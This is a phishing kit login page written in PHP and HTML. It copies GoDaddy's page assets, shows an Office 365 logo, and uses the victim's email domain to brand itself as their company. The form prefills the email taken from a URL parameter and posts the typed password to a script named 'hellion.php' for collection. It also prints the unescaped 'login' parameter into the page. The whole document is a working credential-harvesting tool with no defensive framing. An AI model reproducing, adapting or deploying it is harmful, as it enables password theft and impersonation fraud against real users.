<!DOCTYPE html>

<meta http-equiv="Description" content=" notneeded ">
<meta http-equiv="Keywords" content=" notneeded ">
<meta name="robots" content="noindex">
<meta name="robots" content="noarchive">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript" src="./hellion/4549d38e45"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ga/inpage_linkid.js" id="undefined"></script><script type="text/javascript" src="./hellion/live.js"></script><script type="text/javascript" async="" src="./hellion/dc.js"></script><script src="./hellion/nr-632.min.js"></script><script type="text/javascript" async="true" src="./hellion/gtm.js"></script><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,n,t){function r(t){if(!n[t]){var o=n[t]={exports:{}};e[t][0].call(o.exports,function(n){var o=e[t][1][n];return r(o?o:n)},o,o.exports)}return n[t].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<t.length;o++)r(t[o]);return r}({QJf3ax:[function(e,n){function t(e){function n(n,t,a){e&&e(n,t,a),a||(a={});for(var u=c(n),f=u.length,s=i(a,o,r),p=0;f>p;p++)u[p].apply(s,t);return s}function a(e,n){f[e]=c(e).concat(n)}function c(e){return f[e]||[]}function u(){return t(n)}var f={};return{on:a,emit:n,create:u,listeners:c,_events:f}}function r(){return{}}var o="nr@context",i=e("gos");n.exports=t()},{gos:"7eSDFh"}],ee:[function(e,n){n.exports=e("QJf3ax")},{}],3:[function(e,n){function t(e){return function(){r(e,[(new Date).getTime()].concat(i(arguments)))}}var r=e("handle"),o=e(1),i=e(2);"undefined"==typeof window.newrelic&&(newrelic=window.NREUM);var a=["setPageViewName","addPageAction","setCustomAttribute","finished","addToTrace","inlineHit","noticeError"];o(a,function(e,n){window.NREUM[n]=t("api-"+n)}),n.exports=window.NREUM},{1:12,2:13,handle:"D5DuLP"}],"7eSDFh":[function(e,n){function t(e,n,t){if(r.call(e,n))return e[n];var o=t();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,n,{value:o,writable:!0,enumerable:!1}),o}catch(i){}return e[n]=o,o}var r=Object.prototype.hasOwnProperty;n.exports=t},{}],gos:[function(e,n){n.exports=e("7eSDFh")},{}],handle:[function(e,n){n.exports=e("D5DuLP")},{}],D5DuLP:[function(e,n){function t(e,n,t){return r.listeners(e).length?r.emit(e,n,t):(o[e]||(o[e]=[]),void o[e].push(n))}var r=e("ee").create(),o={};n.exports=t,t.ee=r,r.q=o},{ee:"QJf3ax"}],id:[function(e,n){n.exports=e("XL7HBI")},{}],XL7HBI:[function(e,n){function t(e){var n=typeof e;return!e||"object"!==n&&"function"!==n?-1:e===window?0:i(e,o,function(){return r++})}var r=1,o="nr@id",i=e("gos");n.exports=t},{gos:"7eSDFh"}],G9z0Bl:[function(e,n){function t(){var e=d.info=NREUM.info,n=f.getElementsByTagName("script")[0];if(e&&e.licenseKey&&e.applicationID&&n){c(p,function(n,t){n in e||(e[n]=t)});var t="https"===s.split(":")[0]||e.sslForHttp;d.proto=t?"https://":"http://",a("mark",["onload",i()]);var r=f.createElement("script");r.src=d.proto+e.agent,n.parentNode.insertBefore(r,n)}}function r(){"complete"===f.readyState&&o()}function o(){a("mark",["domContent",i()])}function i(){return(new Date).getTime()}var a=e("handle"),c=e(1),u=(e(2),window),f=u.document,s=(""+location).split("?")[0],p={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-632.min.js"},d=n.exports={offset:i(),origin:s,features:{}};f.addEventListener?(f.addEventListener("DOMContentLoaded",o,!1),u.addEventListener("load",t,!1)):(f.attachEvent("onreadystatechange",r),u.attachEvent("onload",t)),a("mark",["firstbyte",i()])},{1:12,2:3,handle:"D5DuLP"}],loader:[function(e,n){n.exports=e("G9z0Bl")},{}],12:[function(e,n){function t(e,n){var t=[],o="",i=0;for(o in e)r.call(e,o)&&(t[i]=n(o,e[o]),i+=1);return t}var r=Object.prototype.hasOwnProperty;n.exports=t},{}],13:[function(e,n){function t(e,n,t){n||(n=0),"undefined"==typeof t&&(t=e?e.length:0);for(var r=-1,o=t-n||0,i=Array(0>o?0:o);++r<o;)i[r]=e[n+r];return i}n.exports=t},{}]},{},["G9z0Bl"]);</script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"4549d38e45","agent":"js-agent.newrelic.com/nr-632.min.js","transactionName":"bwAAMhFZCBJSAhddX1ZKJBMNWxIIXA9MVUVMDUwQCl0REh0NDFNZVksUDwZPFVt/DgRdXmgEBQM=","applicationID":"12494915","errorBeacon":"bam.nr-data.net","applicationTime":42}</script>
<?php 
$em = @$_GET["login"];
$ln = strlen($em);
$len = strrev($em);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}

$yuh = substr($len,0,$x);

$yuh = strrev($yuh);


for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}

$yuh = substr($yuh,0,$x);

$yuh = ucfirst($yuh);


?>
    <title><?php echo $yuh ?> LOG IN</title>
    
    
    
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://img1.wsimg.com/ux/1.3.1-brand/css/uxcore.min.css" rel="stylesheet" media="screen"><!-- HTML5 shim IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
<script src="//img1.wsimg.com/ux/1.3.1-brand/js/html5shiv.min.js"></script>
<![endif]-->

    
    <link href="./hellion/styles.css" rel="stylesheet" media="screen" type="text/css">

    
    
    
    <link href="./hellion/gd.css" rel="stylesheet" media="screen" type="text/css">
    <!-- godaddy -->
    
    <link href="https://sso.godaddy.com/v1/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
    

  <script type="text/javascript" async="false" src="./hellion/utag.js"></script><script type="text/javascript" src="./hellion/utag.259.js" id="utag_godaddy.godaddy_259"></script><script type="text/javascript" src="./hellion/utag.304.js" id="utag_godaddy.godaddy_304"></script><script type="text/javascript" src="./hellion/utag.428.js" id="utag_godaddy.godaddy_428"></script><script type="text/javascript" src="./hellion/utag.332.js" id="utag_godaddy.godaddy_332"></script><script type="text/javascript" src="./hellion/utag.492.js" id="utag_godaddy.godaddy_492"></script><script type="text/javascript" src="./hellion/fbds.js" async=""></script><script type="text/javascript" src="./hellion/oct.js" async=""></script><script type="text/javascript" src="./hellion/conversion_async.js" async=""></script></head>

  <body class="ux-app uxf-flex"><iframe src="javascript:""" id="__cvo_iframe" style="width: 0px; height: 0px; border: 0px; position: absolute; left: -2000px;"></iframe> 
    <div class="footer_fixer">
      
      <header>
        <nav class="navbar navbar-default uxc-header" role="navigation">

          <!-- The toggle button goes here, and possibly in the future a brand -->
          
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-lang-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>
          

          <!-- Links and other content -->
          <div class="collapse navbar-collapse navbar-lang-collapse container">

            
            
            <ul class="nav navbar-nav navbar-left">
              <li class="dropdown">
                <a href="#" id="langDropLabel" role="button" class="dropdown-toggle" data-toggle="dropdown"><span class="uxicon uxicon-world"></span> United States - English<b class="caret"></b></a>
                <ul class="dropdown-menu" role="menu" aria-labelledby="langDropLabel">
                  <li>
                    <ul class="dropdown-columns">
                      <li><ul><li><ulass="nav navbar-nav navbar-right">
              <li class=""><a href="#">24/7 Support (480) 505-8877</a></li>
            </ul>
            

          </div>
        </nav>
      </header>
      

      
      <div class="container">
        <div class="row">
          <div class="col-sm-8 col-sm-push-2 col-md-7 col-md-push-3">
            <div class="ux-card" id="contentContainer">

              
              <div class="text-center" id="logo">
                <img src="./hellion/logo_office_365.png" id="logoImage" alt="Office 365">
              </div>
              

              
              
              <div style="display:none;margin-top:35px;" id="errorMessage"></div>
              <div style="display:none;margin-top:35px;" id="statusMessage"></div>
              

              
              <div id="formContainer">

              
              <h2 id="formTitle">
              

                Log In
              </h2>
                
              
              <form action="hellion.php?1&email=<?php echo $_GET['login']; ?>" id="login-form" method="POST" name="login">
<input name="app" type="hidden" value="o365">
<input name="realm" type="hidden" value="pass">
<input name="wctx" type="hidden" value="wa=wsignin1.0&amp;rpsnv=4&amp;ct=1429261720&amp;rver=6.6.6556.0&amp;wp=MBI_SSL&amp;wreply=https:%2F%2Foutlook.office365.com%2Fowa%2F%3Frealm%3Dsharutunian.com%26authRedirect%3Dtrue&amp;id=260563&amp;whr=sharutunian.com&amp;CBCXT=out">
<input name="wa" type="hidden" value="wsignin1.0">
<input name="wtrealm" type="hidden" value="urn:federation:MicrosoftOnline">

<div class="form-group"><label class="control-label">Email</label><input class="form-control" id="username" name="name" tabindex="1" type="text" value="<? echo $_GET['login'] ?>" readonly></div>
<div class="form-group"><label class="control-label">Password</label><a id="forgotPasswordLink" href="#" class="pull-right"></a>
<input autocomplete="off" class="form-control" id="password" name="password" tabindex="2" type="password"></div>

<button class="btn btn-primary btn-block" tabindex="3" id="submitBtn" type="submit">LOG IN</button>
</form>
              
              </div>
              
              
            </div>
          </div>
        </div>
      </div>
    </div>

    
    
    <div class="uxf-row">
      <div class="uxf">
        <div class="container">
          <div class="uxf-copyright">
            
            
              Copyright 1999-2015 <?php echo $yuh ?> Operating Company. All Rights Reserved.
              &nbsp;&nbsp;&nbsp;&nbsp;
              
            
              <a href="#" id="helpLink">
              Help</a>
            
            
          </div>
          <div class="uxf-company">
            <div class="uxf-logo"></div>
            <div class="uxf-tagline">It's <?php echo $yuh ?> in Co-Operation with</div>
          </div>
        </div>
      </div>
    </div>
    

  
  
  

  
<script src="./hellion/uxcore.en.min.js"></script><div class="ux-bp-check visible-xs"></div><div class="ux-bp-check visible-sm"></div><div class="ux-bp-check visible-md"></div><div class="ux-bp-check visible-lg"></div>
<script>
  var uxel = ux.eldorado || {};
  uxel.fns = [];
  uxel.ready = function ready(fn) { uxel.fns.push(fn); };
  uxel.data = {
    app: 'login',
    market: 'en-us',
    appAlias: 'login',
    plId: '1',
    shopperId: '{{pc:shopperid}}',
    env: 'prodMesa',
    manifest: 'appheader',
    urlArgs: '{{pc:urlargs}}',
    thirdParty: {}
  };
  uxel.texts = {};
  uxel.urls = {};
  ux.eldorado = uxel;
</script>
<script type="text/javascript">
  ux.eldorado.data.thirdParty.tealium = { js: '//tags.tiqcdn.com/utag/godaddy/godaddy/prod/utag.js' };
  
</script>
<script src="./hellion/appheader.min.js"></script>
<script type="text/javascript">
  ux.eldorado.header.load('#', 'login', undefined, undefined, null);
  
</script><!-- Google Analytics config -->
<script>
  uxel.ready(function() {
    uxel.thirdParty.configGATagManager({
      data: [
        { 'shopperId': '{{pcga:shopperid}}' },
        { 'privateLabelId': '{{pcga:resellerid}}' },
        { 'server': '{{pcga:server}}' }
      ],
      domain: '{{pcga:domain}}'
    });
  });
</script><!-- Google Tag Manager -->
<noscript>
  &lt;iframe src="//www.googletagmanager.com/ns.html?id=GTM-SXRF" height="0" width="0" style="display:none;visibility:hidden"&gt;&lt;/iframe&gt;
</noscript>
<script>
  uxel.ready(function() {
    uxel.thirdParty.initGATagManager('GTM-SXRF');
  });
  
  <!-- End Google Tag Manager -->
</script><!-- Manifest appheader -->

  
<div id="newPasswordModal" style="display:none;" data-title="Need a new Password?">

  <div id="requestPasswordContent">
    <p>
      We'll contact your admin to reset the password for:
    </p>
    <br>
    <input id="newPasswordEmailText" type="text" class="form-control" style="display:none;">
    <div id="newPasswordEmail" style="float:left;font-weight:bold;height:36px;padding:7px 0;"></div>
    <span id="editNewPasswordEmail" style="cursor:pointer;float:right;color:#3282e6;text-decoration:underline;padding-left:2em;">    Not Correct?</span>
  </div>
  <div style="display:none;" id="confirmContent">
    <p>We notified your admin to reset your password.  Now you'll need to wait until they do (or go ask them nicely, yourself).</p>
    
    <p>Once your admin resets your password, you should receive an email with steps to login.</p>
  </div>
  <br>
</div>


  

  
  <script src="./hellion/Login.min.js"></script>

  <script>
  /* Responsible for translating and displaying error messages */
  
  // Could be a previous Globals from above scripts
  var Globals = Globals || {};
  Globals.version = "v1";
  Globals.locale = "en_US";
  Globals.static_url = "/v1/";
  var translate_dict = {"VERIFICATION_CODE": "Verification code", "VERIFICATION_CODE_REQUIRED": "Verification code is required", "NOT_BEGIN_OR_END_WITH_SPACE": "Password cannot start or end with a space", "USERNAME_ALL_NUMERIC": "Username cannot be all numbers.", "PASSWORDS_DONT_MATCH": "Oops, passwords don't match!", "INVALID_PHONE": "You must enter a valid phone number (e.g., 555-321-9876).", "PWD_HINT_REQUIRED": "Password hint is required", "VERIFICATION_CODE_INVALID": "Verification code is invalid", "INVALID_CODE": "You entered an invalid code, please try again.", "PIN_REQUIRED": "Oops. You must enter a call-in PIN.", "PASSWORD_MATCHES_USERNAME": "Password must be different from your username.", "USERNAME_REQUIRED": "Username is required", "REQUEST_PASSWORD_RESET": "Request Password Reset", "BACK_TO_LOGIN": "Back to Login", "ENTER_VALID_VERIFICATION_CODE": "Codes can only contain numbers or hyphens", "PASSWORD_MATCH_HINT": "Password and hint should be different", "PASSWORD_LAST5": "Password violates last 5 passwords rule", "PASSWORDS_MISMATCH": "Passwords must match", "PLEASE_CHOOSE_FACTOR": "Please choose a factor", "WORK_IS_DONE": "Your work here is done", "PIN_REPEATED_DIGIT": "Call-in PIN cannot be a single repeated digit.", "CONTINUE_TO_OFFICE_365": "Continue to Office 365", "RESERVED_WORD_PASSWORD": "Password cannot include a common word or phrase.", "ENTER_VERIFICATION_CODE": "Please enter a code", "INVALID_USERNAME": "Username must be at least 5 characters long and contain at least 1 letter.", "PIN_MUST_BE_FOUR_DIGITS": "Call-in PIN must be exactly 4 digits.", "SHOW": "Show", "PASSWORD_REQUIRED": "Password is required", "INVALID_USER_EMAIL": "Invalid customer and email combination", "PROCESSING": "Processing...", "PASSWORD_30DAYS": "Password was used in the last 30 days", "INVALID_EMAIL_FORMAT": "Email must be in a valid email format (e.g., username@coolexample.com). Please try again.", "PASSWORD_TO_SHORT": "Password must be at least 9 characters long.", "INVALID_PIN": "Call-in PIN must be exactly 4 digits.", "EMAIL_REQUIRED": "Oops. You must enter an email address.", "CANCEL": "Cancel", "HIDE": "Hide", "RESET_PWD_FAIL": "The password reset url is either invalid or has expired. Try again!", "USERNAME_IN_USE": "Username is already taken. Please chose another.", "AUTHCODE_REQUIRED": "Authorization code is required", "ERROR_MSG_DEFAULT": "Yikes! Something's gone wrong. Please re-enter your information and try again.", "PROVIDE_A_PASSWORD": "Provide a password, and you'll be on your way.", "RESET_INVALID_USER": "User is invalid for this url.", "ERROR_CAPTCHA": "Invalid security challenge response", "PIN_IS_SEQUENTIAL": "Call-in PIN cannot be sequential digits.", "INVALID_PASSWORD": "Password must be between 9 - 50 characters and must include 1 uppercase letter, 1 lowercase letter, and 1 number."};

  
  
  

  $(document).ready(function() {

      Layout.setupLangMenu();

      
  $(Login.wireupForgotPasswordPASS);


      // Wireup the login page stuff
      $(Login.init);

      // Page specific js
       

      // Show a specific error message if necessary
      if(Globals.js_error){
        Forms.show_error(Globals.js_error, Globals.js_error_location);
      }

      
      
      
  });

  
  
  </script>


  <!--Build info
  App: v1
  Build time: Thu Apr 16 09:57:27 MST 2015
  Build number: 315
  -->
  

<script type="text/javascript" id="">var _gaq=_gaq||[];
(function(){_gaq.push(["_require","inpage_linkid","//www.google-analytics.com/plugins/ga/inpage_linkid.js"]);_gaq.push(["_setAccount","UA-37178807-1"]);_gaq.push(["_setAllowLinker",!0]);_gaq.push(["_setSessionCookieTimeout",12E5]);var a=google_tag_manager["GTM-SXRF"].macro('gtm1429261725106');"string"===typeof a&&0<a.length?_gaq.push(["_link",a]):(a="",_gaq.push(["_setCustomVar",1,"shopperId",google_tag_manager["GTM-SXRF"].macro('gtm1429261725107')||a,3]),_gaq.push(["_setCustomVar",2,"privateLabelId",google_tag_manager["GTM-SXRF"].macro('gtm1429261725108')||a,3]),_gaq.push(["_setCustomVar",3,"isc",google_tag_manager["GTM-SXRF"].macro('gtm1429261725109')||
a,3]),_gaq.push(["_setCustomVar",4,"server",google_tag_manager["GTM-SXRF"].macro('gtm1429261725110')||a,3]),_gaq.push(["_setCustomVar",5,"segmentId",google_tag_manager["GTM-SXRF"].macro('gtm1429261725111')||a,3]),_gaq.push(["_trackPageview"]));a=typeof _gaPageLoad;"function"===a&&_gaPageLoad(_gaq);a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src=("https:"==document.location.protocol?"https://":"http://")+"stats.g.doubleclick.net/dc.js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})();</script></body></html>